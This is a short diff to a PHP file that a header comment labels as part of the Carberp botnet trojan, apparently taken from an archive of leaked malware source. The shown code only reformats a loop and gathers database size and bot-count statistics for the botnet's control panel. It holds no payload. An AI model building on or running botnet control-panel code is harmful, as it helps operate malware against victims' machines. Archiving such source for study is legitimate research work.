@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 get_function('size_format');
@@ -32,7 +43,8 @@ $bots['search_result'] = $mysqli->query_name('SELECT COUNT(id) count FROM bf_sea
 
 $db_stats = $mysqli->query("SHOW TABLE STATUS");
 
-foreach($db_stats as $value){	$value->all_size = $value->Avg_row_length + $value->Data_length + $value->Index_length + $value->Data_free;
+foreach($db_stats as $value){
+	$value->all_size = $value->Avg_row_length + $value->Data_length + $value->Index_length + $value->Data_free;
 	$value->percent = number_format(($value->all_size / $value->Max_data_length) * 100, 2);
 	$db_stat[$value->Name] = $value;
 }
